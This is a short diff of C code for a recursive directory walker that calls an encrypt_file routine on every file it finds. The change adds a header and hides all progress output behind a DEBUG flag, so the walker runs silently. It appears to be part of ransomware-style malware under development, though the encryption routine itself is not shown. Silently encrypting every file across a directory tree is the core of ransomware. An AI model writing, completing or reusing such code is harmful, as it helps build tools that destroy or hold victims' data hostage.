@@ -1,6 +1,8 @@
 #include <stdio.h>
 #include <dirent.h>
 #include <string.h>
+
+#include "includes.h"
 /**
  * DT_DIR is defined in the file <unistd.h>,
  * but it is not supported in ANSI C.
@@ -66,14 +68,21 @@ int listdir(char *name, int depth) {
         strcat(path, entry->d_name);
 
         if (is_inode(entry)) {
+#ifdef DEBUG
             printf("Node: %s\n", path);
+#endif
+            continue;
         }
         else if (is_dir(entry)) {
+#ifdef DEBUG
             printf("Catalog: %s\n", path);
+#endif
             listdir(path, depth + 1);
         }
         else if (is_file(entry)) {
+#ifdef DEBUG
             printf("encrypt: File: '%s'\n", path);
+#endif
             encrypt_file(path);
         }
     } while ((entry = readdir(dir)));
